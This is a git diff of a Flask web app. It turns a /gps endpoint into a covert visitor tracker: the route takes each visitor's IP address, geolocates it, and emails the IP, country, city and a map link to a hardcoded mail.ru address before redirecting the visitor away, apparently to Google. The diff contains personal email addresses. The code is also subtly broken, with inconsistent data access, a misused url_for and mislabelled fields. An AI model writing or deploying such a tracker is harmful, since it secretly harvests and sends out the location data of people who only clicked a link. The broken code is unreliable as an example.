@@ -1,5 +1,9 @@
-from flask import Flask, jsonify, request
+from flask import Flask, jsonify, request, redirect, url_for
 import requests
+from config import sender_email, mail_password
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import smtplib
 from main import get_info_by_ip
 
 app = Flask(__name__)
@@ -13,9 +17,42 @@ def hello_world():
 
 @app.route("/gps", methods=["GET"])
 def get_my_ip():
-    ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
-    get_info_by_ip(ip=ip)
-    return jsonify({'ip': request.remote_addr})
+    response = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
+    data = get_info_by_ip(ip=response)
+
+    req_site = f'https://gps-coordinates.org/my-location.php?lat={data.lat}&lng={data.long}'
+    msg = MIMEMultipart('alternative')
+
+    html = f"""
+            <html>
+              <head></head>
+              <body>
+                <h1> {data["ip"]} </h1>
+                <a href={req_site}> Link </a>
+                <h3> Время: {data["Country"]}</h3>
+                <h3> Телефон: {data["city"]} </h3>
+              </body>
+            </html>
+            """
+
+    part2 = MIMEText(html, 'html')
+    msg.attach(part2)
+    msg['Subject'] = 'privet'
+    msg['From'] = "66nurlybek@gmail.com"
+    msg['To'] = "merkhat181@mail.ru"
+
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.ehlo()
+        server.starttls()
+        server.login(sender_email, mail_password)
+        server.sendmail(msg['From'], msg['To'], msg.as_string())
+        print("Email has been sent")
+        server.quit()
+        return redirect(url_for("https://www.google.com/"))
+
+    except Exception:
+        return redirect(url_for("/"))
 
 
 @app.route('/test')
